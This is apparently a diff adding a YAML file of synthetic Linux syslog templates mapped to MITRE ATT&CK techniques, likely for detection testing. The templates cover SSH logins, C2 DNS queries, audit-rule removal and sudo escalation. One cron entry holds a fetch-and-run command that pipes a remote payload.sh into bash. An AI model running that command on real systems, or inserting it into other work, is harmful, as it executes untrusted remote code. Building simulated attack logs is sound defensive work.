@@ -1,0 +1,134 @@
+# data/log_templates/linux_attack.yml
+# Linux-sourced MITRE technique templates (auth, kern, daemon logs)
+
+- technique_id: "T1595.001"
+  logs:
+    - source: linux_syslog
+      event_id: null
+      category: network
+      severity: info
+      message: "kernel: iptables: IN=eth0 OUT= SRC={source_ip} DST={target_ip} PROTO=TCP DPT={port} flags: SYN"
+      fields:
+        hostname: "{target_host}"
+        source_ip: "{source_ip}"
+        destination_ip: "{target_ip}"
+        destination_port: "{port}"
+        raw_data:
+          facility: kern
+          tag: kernel
+          pid: null
+
+- technique_id: "T1190"
+  logs:
+    - source: linux_syslog
+      event_id: null
+      category: process_creation
+      severity: critical
+      message: "sshd[{pid}]: Accepted publickey for {username} from {source_ip} port {port} ssh2: RSA SHA256:A3f..."
+      fields:
+        hostname: "{target_host}"
+        username: "{username}"
+        source_ip: "{source_ip}"
+        process_name: "sshd"
+        raw_data:
+          facility: auth
+          tag: sshd
+          pid: "{pid}"
+
+- technique_id: "T1078"
+  logs:
+    - source: linux_syslog
+      event_id: null
+      category: authentication
+      severity: medium
+      message: "sshd[{pid}]: Accepted password for {username} from {source_ip} port {port} ssh2"
+      fields:
+        hostname: "{target_host}"
+        username: "{username}"
+        source_ip: "{source_ip}"
+        process_name: "sshd"
+        raw_data:
+          facility: auth
+          tag: sshd
+          pid: "{pid}"
+
+- technique_id: "T1053.005"
+  logs:
+    - source: linux_syslog
+      event_id: null
+      category: scheduled_task
+      severity: high
+      message: "cron[{pid}]: ({username}) CMD (bash -c 'curl http://{target_ip}/payload.sh | bash')"
+      fields:
+        hostname: "{target_host}"
+        username: "{username}"
+        process_name: "cron"
+        command_line: "curl http://{target_ip}/payload.sh | bash"
+        raw_data:
+          facility: cron
+          tag: cron
+          pid: "{pid}"
+
+- technique_id: "T1071.004"
+  logs:
+    - source: linux_syslog
+      event_id: null
+      category: network
+      severity: high
+      message: "named[{pid}]: queries: client {source_ip}: query {c2_domain} TXT response: NOERROR [{bytes} bytes]"
+      fields:
+        hostname: "{target_host}"
+        source_ip: "{source_ip}"
+        destination_port: 53
+        process_name: "named"
+        raw_data:
+          facility: daemon
+          tag: named
+          pid: "{pid}"
+          query: "{c2_domain}"
+
+- technique_id: "T1070.001"
+  logs:
+    - source: linux_syslog
+      event_id: null
+      category: audit
+      severity: critical
+      message: "auditd[{pid}]: type=CONFIG_CHANGE msg=audit({ts}): op=remove_rule items=0"
+      fields:
+        hostname: "{target_host}"
+        username: "{username}"
+        process_name: "auditd"
+        raw_data:
+          facility: daemon
+          tag: auditd
+          pid: "{pid}"
+
+- technique_id: "T1548.003"
+  logs:
+    - source: linux_syslog
+      event_id: null
+      category: authentication
+      severity: high
+      message: "sudo[{pid}]:  {username} : TTY=pts/0 ; PWD=/home/{username} ; USER=root ; COMMAND=/bin/bash"
+      fields:
+        hostname: "{target_host}"
+        username: "{username}"
+        process_name: "sudo"
+        raw_data:
+          facility: auth
+          tag: sudo
+          pid: "{pid}"
+
+    - source: linux_syslog
+      event_id: null
+      category: authentication
+      severity: critical
+      message: "su[{pid}]: Successful su for root by {username}"
+      fields:
+        hostname: "{target_host}"
+        username: "{username}"
+        process_name: "su"
+        raw_data:
+          facility: auth
+          tag: su
+          pid: "{pid}"
